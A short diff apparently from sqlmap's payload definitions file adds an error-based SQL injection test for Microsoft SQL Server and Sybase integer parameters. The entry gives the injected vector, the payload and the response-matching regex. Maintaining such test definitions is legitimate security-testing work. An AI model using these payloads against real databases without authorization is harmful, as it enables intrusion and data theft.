@@ -1676,6 +1676,27 @@ Formats:
     </test>
 
     <test>
+        <title>Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+            <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
         <title>Oracle error-based - Parameter replace</title>
         <stype>2</stype>
         <level>3</level>
